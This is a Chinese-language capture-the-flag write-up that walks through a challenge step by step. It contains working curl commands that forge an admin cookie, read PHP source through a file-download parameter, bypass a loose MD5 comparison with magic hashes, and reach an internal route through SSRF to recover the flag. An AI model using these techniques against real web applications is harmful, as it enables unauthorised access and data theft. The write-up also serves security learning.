# 值班邮件台 WP

## Flag

```
ISCC{ACxmCnWgL3C7LqWImKfgtK6h}
```

## 信息收集

访问首页 `http://39.105.213.28:49103/`，发现「值班邮件台」页面，当前登录用户为 `guest`，角色为 `user`。

页面列出三封内部邮件：

1. **\[联调\] 登录态先保留旧方案** — 透露登录态基于浏览器侧旧标记（Cookie），可切身份联调
2. **\[运维\] 预览面板只保留本机诊断能力** — 预览面板收敛为仅本机诊断，诊断地址已整理
3. **\[提醒\] 双人复核别再走形式** — 双人复核曾被绕过，改成了先做摘要再比对

每封邮件底部有「进入后台预览面板」链接指向 `/admin.php`。

邮件提示「前端页面会继续沿用浏览器侧那套旧标记，方便大家切身份联调」，修改 Hackbar改Cookie `mail_role=admin` 即可绕过鉴权进入后台面板。

后台页面中存在联调说明链接：

```
/download.php?file=files/notes/preview-readme.txt
```

尝试路径穿越和直接读取，发现可读取 web 根目录下的 `admin.php` 源码（双人复核逻辑已被"单独摘录"放置在 web 根目录）：

```bash
curl -s "http://39.105.213.28:49103/download.php?file=admin.php" -b 'mail_role=admin'
```

获得数据：
- **preview-readme.txt**: 说明后台仅供管理员查看本机诊断结果
- **route-index.txt**: 泄露内部路由，包含 `final -> /internal/report?view=flag&slot=last`

`admin.php` 源码中双人复核验证逻辑：

```php
$tokenA = (string)($_POST['token_a'] ?? '');
$tokenB = (string)($_POST['token_b'] ?? '');

if ($tokenA === '' || $tokenB === '') {
    exit('两份预览凭据都需要填写');
}
if ($tokenA === $tokenB) {
    exit('两份输入不能完全相同');
}

$h1 = md5($tokenA);
$h2 = md5($tokenB);

if ($h1 == $h2 && $h1 !== $h2) {
    echo "校验通过";
} else {
    echo "双人复核失败";
}
```

核心漏洞：`$h1 == $h2` 使用 PHP 宽松比较（`==`），存在类型混淆（Type Juggling）。

**利用原理**：找到两个不同字符串，其 MD5 值均以 `0e` 开头且后续全是数字（科学计数法 `0e...` 在 `==` 比较时均被解析为 `0`）。

经典 PHP Magic Hash：

| 字符串 | MD5 |
|--------|-----|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `s878926199a` | `0e545993274517709034328855841020` |

任意取两个不同字符串作为 `token_a` 和 `token_b` 即可通过验证。

## Step 4 — SSRF 获取 Flag

验证通过后，`target_url` 参数会触发服务端请求。route-index.txt 泄露的内部路由：

```
- health  -> /internal/health
- mailq   -> /internal/queue
- final   -> /internal/report?view=flag&slot=last
```

提交别名 `final` 或直接路径均报错，需使用完整 URL 发起 SSRF：

```bash
curl -s -X POST http://39.105.213.28:49103/admin.php \
  -b 'mail_role=admin' \
  -d 'token_a=240610708&token_b=QNKCDZO&target_url=http://127.0.0.1/internal/report?view=flag%26slot=last'
```

服务端请求 `http://127.0.0.1/internal/report?view=flag&slot=last`，返回 Flag。

## 总结

| 步骤 | 漏洞类型 | 关键点 |
|------|---------|--------|
| 1 | 客户端鉴权绕过 | Cookie `mail_role` 可被用户篡改 |
| 2 | 任意文件读取 | `download.php?file=` 可读 web 根目录 PHP 源码 |
| 3 | PHP Type Juggling | MD5 Magic Hash 绕过 `==` 宽松比较 |
| 4 | SSRF | 通过服务端请求内部 `/internal/report` 获取 flag |
